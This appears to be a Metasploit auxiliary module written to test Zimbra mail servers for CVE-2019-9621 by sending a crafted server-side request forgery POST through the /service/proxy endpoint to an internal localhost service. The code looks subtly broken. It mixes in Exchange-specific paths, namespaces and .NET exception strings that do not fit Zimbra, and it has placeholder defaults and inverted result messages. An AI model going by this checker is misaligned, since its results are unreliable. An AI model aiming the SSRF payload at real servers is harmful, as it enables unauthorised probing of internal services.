##
# This module tests if a Zimbra mail server is vulnerable to the CVE-2019-9621 vulnerability.
#
# Reference:
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9621
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Zimbra Mail Server CVE-2019-9621 Vulnerability Checker',
      'Description'    => 'Checks if a Zimbra mail server is vulnerable to the CVE-2019-9621 vulnerability.',
      'Author'         => ['Author Name'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2019-9621']
      ]
    ))

    register_options([
      Opt::RHOST('zimbra-server-ip', 'The IP address of the Zimbra mail server'),
      Opt::RPORT(443, 'The port to use for the connection')
    ])
  end

  def run
    begin
      print_status("Connecting to the Zimbra mail server...")
      connect

      print_status("Sending request to check for CVE-2019-9621 vulnerability...")
      res = send_request_raw({
        'uri' => '/service/proxy?target=https%3A%2F%2F127.0.0.1%3A7071%2Fservice%2Fews%2Fmrsproxy.svc',
        'method' => 'POST',
        'headers' => {
          'Content-Type' => 'application/x-www-form-urlencoded',
          'Cookie' => 'ZM_TEST=true'
        },
        'data' => 'Zimbra-xmpprequest=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3Cxmpptest+to%3D%22test%40test.com%22+from%3D%22test%40test.com%22+type%3D%22get%22+id%3D%221%22%3E%3Cservice%3Eurn%3Aschemas%3Amicrosoft%3Acom%3Aexchange%3Aservices%3A2006%3Amessages%3C%2Fservice%3E%3C%2Fxmpptest%3E'
      })

      if res and res.code == 500 and res.body.include?('System.Reflection.TargetInvocationException') and res.body.include?('System.Net.WebException')
        print_error("The Zimbra mail server is vulnerable to the CVE-2019-9621 vulnerability.")
      else
        print_good("The Zimbra mail server is not vulnerable to the CVE-2019-9621 vulnerability.")
      end

    rescue ::Rex::ConnectionError
      print_error("Could not connect to the Zimbra mail server.")
    ensure
      disconnect
    end
  end

end
